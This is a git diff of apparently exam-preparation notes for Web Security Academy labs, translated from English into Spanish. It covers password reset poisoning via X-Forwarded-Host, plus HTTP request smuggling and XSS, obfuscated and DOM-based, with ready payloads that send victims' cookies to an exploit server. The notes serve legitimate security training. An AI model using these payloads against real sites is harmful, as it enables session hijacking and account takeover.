@@ -2037,21 +2037,20 @@ Go to MyAccount and Forgot Password. Send password request for Carlos and view t
 
 - Reset password
 
-When entering the wrong user while trying to reset the password there is a specific error message -> `"Invalid username"`\
-This allows you to enumerate the user. Normally is “carlos” which seems to be the standard user across the web apps.\
-Selecting Home directory GET request and running ParamMiner finds additional headers to use. In this case X-Forwarded-Host is supported.\
+Usuario erróneo -> `"Invalid username"`\
+Permite enumeración. El user normal será "Carlos".\
+GET al directorio Home / > ParamMiner y encontrar otras cabeceras a usar. En este caso -> `X-Forwarded-Host` se puede, meter el exploit server.\
 
-POST /forgot-password. Notice that the X-Forwarded-Host header is supported and you can use it to point the dynamically generated reset link to anarbitrary domain.\
+POST /forgot-password. Cabecera `X-Forwarded-Host` habilitada y se puede usar para enviar el link de reset de contraseña al exploit server.\
 Make a note of the exploit server URL.\
-Go back to the request in Burp Repeater and add the X-Forwarded-Host header with your exploit server URL:\
-X-Forwarded-Host: your-exploit-server-id.web-security-academy.net\
-Change the username parameter to carlos and send the request.\
+Ir al Burp Repeater y añadir `X-Forwarded-Host` con la URL del exploit server:\
+X-Forwarded-Host: exploit-server-id.web-security-academy.net\
+cambiar el username a carlos y darle a send.\
 
-- Smuggling + XSS
-
-Through User Agent\
-Let Burp Scanner find the HTTP Smuggle request and returns a 200 response, some will give you 400’s which are useless. Use that request, delete all the “sec” headers – they’re useless.\
-Add this to the end of the request that burp generated (changing url’s and all):\
+- Smuggling + XSS en el User Agent\
+Burp Scanner o extensión Smuggler para encontrar el HTTP Smuggling.\
+Quitar las cabeceras useless como "Sec".\
+Añadir al final de la request generada por Burp (cambiando deatos de URLs y demás):\
 ```
 GET /post?postId=4 HTTP/1.1
 Host: <change>.web-security-academy.net
@@ -2059,17 +2058,24 @@ User-agent: "><script>alert(document.cookie);var x=new XMLHttpRequest();
 x.open("GET","https://exploit-<change>.web-security-
 academy.net/"+document.cookie);x.send();</script>
 ```
-And then send it through intruder with null payloads like 100 or so times\
+Enviar eso al Intruder y meterle 100 null payloads.\
 
 - XSS
 
-XSS in the search bar, the one where you have to check every tag, and every attribute through Burp Intruder\
+En la barra de búsqueda, checkear TODOS los tags y atributos con el Intruder:\
 **Tags and attribute that was allowed:**\
 `<body onhashchange=>`\
 **Payload that was sent to victim**\
-
 ```
 <iframe src="https://acac1f2c1e7f6507c0a71e0c00b100d9.web-security-academy.net/?query=%27%3Cbody%20onhashchange=%22eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vZXhwbG9pdC1hYzQ0MWY0MDFlZjg2NTkxYzA4ZDFlZGMwMWNlMDBiYy53ZWItc2VjdXJpdHktYWNhZGVteS5uZXQvP2M9Jytkb2N1bWVudC5jb29raWU'))%22%3E//"onload="this.onload='';this.src+='#XSS'"></iframe>
+```
+
+- DOM XSS
+
+```
+<iframe src=https://ac411f1d1fb8c2dec055ffa800370084.web-security-academy.net/
+onload='this.contentWindow.postMessage("{\"type\":\"redirect\",\"redirectUrl\":\"javascript:window.location=%22https://exploit-ac1a1f191f10c29dc09cff9c0110008b.web-security-
+academy.net/?c=%22%2bdocument.cookie\"}","*")'>
 ```
 
 -----
